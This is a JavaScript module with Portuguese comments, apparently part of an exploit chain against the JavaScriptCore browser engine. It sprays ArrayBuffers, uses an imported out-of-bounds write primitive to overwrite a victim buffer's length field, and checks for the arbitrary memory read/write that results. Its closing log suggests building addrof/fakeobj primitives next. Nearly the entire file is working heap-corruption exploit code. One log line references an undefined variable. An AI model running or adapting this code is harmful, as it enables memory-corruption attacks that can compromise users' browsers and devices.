// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

function sprayArrayBuffers(count, size, logFn = logS3) {
    const sprayedAbs = [];
    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABs");
    for (let i = 0; i < count; i++) {
        try {
            sprayedAbs.push(new ArrayBuffer(size));
        } catch (e) {
            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABs");
        }
    }
    logFn(`${sprayedAbs.length} ArrayBuffers pulverizados.`, sprayedAbs.length > 0 ? "good" : "warn", "sprayABs");
    return sprayedAbs;
}

async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSize, logFn = logS3, FNAME_PARENT = "") {
    const FNAME_CHILD = `${FNAME_PARENT}.attemptRW`;
    logFn(` -> Verificando AB corrompido: Original Size=${originalSize}, Current Size=${ab.byteLength}, Target Corrupted Size=${toHex(newExpectedSize)}`, "info", FNAME_CHILD);

    if (ab.byteLength !== newExpectedSize) {
        logFn(`    -> FALHA NA VERIFICAÇÃO DE TAMANHO: AB.byteLength é ${toHex(ab.byteLength)}, esperava ${toHex(newExpectedSize)}.`, "error", FNAME_CHILD);
        return false;
    }

    logFn(`    -> SUCESSO NA CORRUPÇÃO DE TAMANHO: AB.byteLength é ${toHex(ab.byteLength)} como esperado!`, "vuln", FNAME_CHILD);

    try {
        const corruptedDv = new DataView(ab);
        const readOffsetBeyondOriginal = originalSize + Math.floor(originalSize / 4); // Um pouco além do original
        const testWriteVal = 0xABCDDCBA; // Valor diferente para fácil identificação

        if (readOffsetBeyondOriginal + 4 <= ab.byteLength) {
            logFn(`    Escrevendo ${toHex(testWriteVal)} em offset ${readOffsetBeyondOriginal} (original era ${originalSize})...`, "info", FNAME_CHILD);
            corruptedDv.setUint32(readOffsetBeyondOriginal, testWriteVal, true);
            const readBack = corruptedDv.getUint32(readOffsetBeyondOriginal, true);

            if (readBack === testWriteVal) {
                logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (NOVO TAMANHO ${toHex(ab.byteLength)}) OBTIDA! Leu ${toHex(readBack)} de offset ${readOffsetBeyondOriginal}`, "critical", FNAME_CHILD);
                // Tentar ler um ponteiro como exemplo
                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) {
                    const pLow = corruptedDv.getUint32(readOffsetBeyondOriginal + 4, true); // Ler um pouco mais adiante
                    const pHigh = corruptedDv.getUint32(readOffsetBeyondOriginal + 8, true); // e mais 4 bytes
                    logFn(`       Exemplo de Leitura U64 em offset ${readOffsetBeyondOriginal + 4}: H=${toHex(pHigh)} L=${toHex(pLow)}`, "leak", FNAME_CHILD);
                }
                return true; // Indica sucesso na R/W
            } else {
                logFn(`    -> Falha na verificação R/W no AB corrompido (leu ${toHex(readBack)}, esperava ${toHex(testWriteVal)})`, "warn", FNAME_CHILD);
            }
        } else {
            logFn(`    -> Offset de teste R/W (${readOffsetBeyondOriginal}) está fora do novo tamanho do buffer (${ab.byteLength}). Isso é inesperado se o tamanho foi corrompido para um valor grande.`, "error", FNAME_CHILD);
        }
    } catch (e_rw) {
        logFn(`    -> Erro ao tentar R/W no AB corrompido (mesmo com tamanho grande): ${e_rw.message}`, "error", FNAME_CHILD);
    }
    return false;
}


export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure";

    // Configuração do teste
    const CORRUPTION_AB_CONFIG = {
        spray_count: 250, // Aumentar para mais chances
        victim_ab_size: 128, // Tamanho consistente para spray
        // !! VALIDE ESTE OFFSET COM SEUS BINÁRIOS !!
        // Este é o offset do campo de tamanho (byteLength) DENTRO do objeto JSArrayBuffer,
        // relativo ao início do JSArrayBuffer (que começa com JSCell).
        // Baseado na análise de ArrayBuffer.txt e JSObjectGetArrayBufferByteLength, este deve ser 0x30.
        size_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),

        corrupted_size_value: 0x100000, // Um tamanho grande, mas não excessivamente para evitar problemas de alocação com DataView. (1MB)
        
        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (128 * 20), // Varredura mais ampla
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768), // Até o fim da janela OOB
        search_step: 8, // Alinhamento comum de objetos
        max_successful_corruptions_to_find: 1, // Parar após o primeiro sucesso
        attempts: 1, // Número de tentativas completas de spray e corrupção
    };

    logS3(`--- Iniciando Teste de Corrupção de TAMANHO de ArrayBuffer (S3) (v2.5) ---`, "test", FNAME);
    logS3(`   Config: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B, SizeFieldOffsetInAB=${toHex(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object)}`, "info", FNAME);
    logS3(`   CorruptedSizeTarget=${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)}`, "info", FNAME);

    let successfulCorruptionsFound = 0;
    let successfullyCorruptedAB = null;

    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

        logS3(`Tentativa de Corrupção de Tamanho de AB #${attempt + 1}/${CORRUPTION_AB_CONFIG.attempts}...`, "test", FNAME);
        await triggerOOB_primitive(logS3);
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        const victimAbs = sprayArrayBuffers(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size, logS3);
        if (victimAbs.length === 0) {
            logS3("Nenhum ArrayBuffer vítima pulverizado. Abortando tentativa.", "error", FNAME);
            clearOOBEnvironment(logS3);
            continue;
        }
        await PAUSE_S3(LONG_PAUSE_S3); // Pausa mais longa para o heap assentar após o spray

        logS3(` Iniciando varredura de offsets de ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_start)} a ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_end)}`, "info", FNAME);
        let lastLoggedScanOffset = CORRUPTION_AB_CONFIG.search_base_offset_start;

        for (let baseCandidateOffset = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffset < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffset += CORRUPTION_AB_CONFIG.search_step) {

            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

            // Garantir que estamos dentro dos limites para ler/escrever o campo de tamanho
            if (baseCandidateOffset < 0 || baseCandidateOffset + CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object + 4 > oob_array_buffer_real.byteLength) {
                continue;
            }

            const absOffsetForVictimSizeField = baseCandidateOffset + CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object;
            let originalValueAtSizeOffset;

            try {
                originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSizeField, 4, logS3);
            } catch (e_read) {
                // Se não puder ler, pular este offset candidato
                if (baseCandidateOffset > lastLoggedScanOffset + (1024 * 5)) { // Logar menos frequentemente se houver muitos erros de leitura
                    logS3(`  Falha ao ler valor original em ${toHex(absOffsetForVictimSizeField)}. Pulando.`, "warn", FNAME);
                    lastLoggedScanOffset = baseCandidateOffset;
                }
                continue;
            }

            // Logar menos frequentemente para não inundar o console
            if (baseCandidateOffset > lastLoggedScanOffset + (1024 * 50) || baseCandidateOffset === CORRUPTION_AB_CONFIG.search_base_offset_start) {
                 logS3(`  Testando base speculativa ${toHex(baseCandidateOffset)}. Tentando corromper TAMANHO em abs ${toHex(absOffsetForVictimSizeField)} para ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)}. Original: ${toHex(originalValueAtSizeOffset)}`, "info", FNAME);
                 lastLoggedScanOffset = baseCandidateOffset;
            }

            try {
                oob_write_absolute(absOffsetForVictimSizeField, CORRUPTION_AB_CONFIG.corrupted_size_value, 4, logS3);
            } catch (e_write) {
                // Restaurar imediatamente se a escrita falhar, embora improvável se a leitura funcionou e os limites estão corretos
                try { oob_write_absolute(absOffsetForVictimSizeField, originalValueAtSizeOffset, 4, logS3); } catch (e_restore_fail) {/*silencioso*/}
                continue;
            }

            let foundThisIteration = false;
            for (let i = 0; i < victimAbs.length; i++) {
                if (!victimAbs[i]) continue;
                try {
                    if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.corrupted_size_value) {
                        if (await attemptReadWriteOnCorruptedBuffer(victimAbs[i], CORRUPTION_AB_CONFIG.victim_ab_size, CORRUPTION_AB_CONFIG.corrupted_size_value, logS3, FNAME)) {
                            successfulCorruptionsFound++;
                            successfullyCorruptedAB = victimAbs[i]; // Salvar referência
                            logS3(`     !!! SUCESSO MESTRE com base ${toHex(baseCandidateOffsetForVictimAB)} para corrupção de tamanho !!!`, "critical", FNAME);
                            foundThisIteration = true;
                            break; // Sair do loop interno de verificação dos victimAbs
                        }
                    }
                } catch (e_check_size) { /*silencioso, o acesso a byteLength pode falhar se o objeto estiver muito corrompido*/ }
            }

            // Restaurar o valor original do tamanho ANTES de tentar o próximo baseCandidateOffset
            try {
                oob_write_absolute(absOffsetForVictimSizeField, originalValueAtSizeOffset, 4, logS3);
            } catch (e_restore) {
                logS3(`  AVISO: Falha ao restaurar tamanho em ${toHex(absOffsetForVictimSizeField)}. Erro: ${e_restore.message}`, "warn", FNAME);
            }

            if (foundThisIteration) break; // Sair do loop de baseCandidateOffset
        } // Fim do loop de baseCandidateOffset

        clearOOBEnvironment(logS3);
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

        logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima...`);
        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3 * 2);
    }

    if (successfullyCorruptedAB) {
        logS3("!!! PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA (LIMITADA) OBTIDA !!!", "escalation", FNAME);
        logS3("  Pode usar o ArrayBuffer corrompido para construir addrof/fakeobj.", "info", FNAME);
        // Aqui você pode adicionar chamadas para testar addrof/fakeobj usando 'successfullyCorruptedAB'
        // Ex: testAddrofWithCorruptedAB(successfullyCorruptedAB);
    } else {
        logS3("Nenhuma corrupção de tamanho de ArrayBuffer bem-sucedida para obter R/W arbitrária.", "warn", FNAME);
    }
    logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos: ${successfulCorruptionsFound}) ---`, "test", FNAME);
}
